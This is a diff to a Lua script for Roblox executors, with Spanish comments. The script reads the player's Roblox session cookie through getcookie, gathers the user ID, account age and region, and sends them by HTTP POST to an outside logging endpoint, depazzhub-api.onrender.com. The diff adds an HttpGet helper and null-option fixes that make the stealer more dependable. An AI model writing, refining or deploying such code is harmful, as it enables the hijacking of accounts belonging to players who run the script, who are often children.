@@ -1,7 +1,11 @@
+-- webhook.lua - VERSIÓN FINAL CORREGIDA
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalizationService = game:GetService("LocalizationService")
 
+-- =====================================================================
+-- FUNCIÓN UNIVERSAL PARA OBTENER LA COOKIE
+-- =====================================================================
 local function GetRobloxCookie()
     local success, cookie = pcall(getcookie)
     if success and cookie and type(cookie) == "string" and cookie ~= "" then
@@ -35,9 +39,12 @@ local function GetRobloxCookie()
         end
     end
 
-    return "Error. May a security"
+    return "NO_COOKIE_FOUND_EXECUTOR_LIMITADO"
 end
 
+-- =====================================================================
+-- FUNCIÓN DE PETICIÓN HTTP
+-- =====================================================================
 local function Request(options)
     options = options or {}
     local url = options.Url or ""
@@ -64,6 +71,7 @@ local function Request(options)
         bodyString = HttpService:JSONEncode(body)
     end
 
+    -- Intento con request() del executor
     local customRequest = getgenv().request or (getgenv().syn and getgenv().syn.request) or (getgenv().http and getgenv().http.request)
     if customRequest then
         local success, response = pcall(function()
@@ -79,6 +87,7 @@ local function Request(options)
         end
     end
 
+    -- Fallback a HttpService de Roblox
     local successHttp, responseHttp = pcall(function()
         if method == "GET" then
             return HttpService:GetAsync(url, false)
@@ -88,17 +97,24 @@ local function Request(options)
     end)
     
     if successHttp and responseHttp then
-        return {
-            Success = true,
-            StatusCode = 200,
-            Body = responseHttp
-        }
+        return { Success = true, StatusCode = 200, Body = responseHttp }
     end
     
     return nil
 end
 
+local function HttpGet(url, options)
+    options = options or {} -- ✅ Corrección
+    return Request({
+        Url = url,
+        Method = "GET",
+        Headers = options.Headers or {},
+        Timeout = options.Timeout or 15
+    })
+end
+
 local function HttpPost(url, body, options)
+    options = options or {} -- ✅ Corrección CRÍTICA aquí
     return Request({
         Url = url,
         Method = "POST",
@@ -108,6 +124,9 @@ local function HttpPost(url, body, options)
     })
 end
 
+-- =====================================================================
+-- DATOS Y EJECUCIÓN
+-- =====================================================================
 local function GetAccountAge()
     local player = Players.LocalPlayer
     if not player then return "Desconocido" end
@@ -126,6 +145,9 @@ local function GetRegion()
     return LocalizationService.RobloxLocaleId
 end
 
+-- =====================================================================
+-- MAIN
+-- =====================================================================
 local success, result = pcall(function()
     local player = Players.LocalPlayer
     local placeId = game.PlaceId
@@ -147,6 +169,7 @@ local success, result = pcall(function()
     print("  User ID: " .. tostring(player.UserId))
     print("  Cookie: " .. (cookieValue ~= "NO_COOKIE_FOUND_EXECUTOR_LIMITADO" and "Detectada ✅" or "No detectada ❌"))
     
+    -- Llamada a HttpPost
     local response = HttpPost("https://depazzhub-api.onrender.com/log", data)
     
     if response then
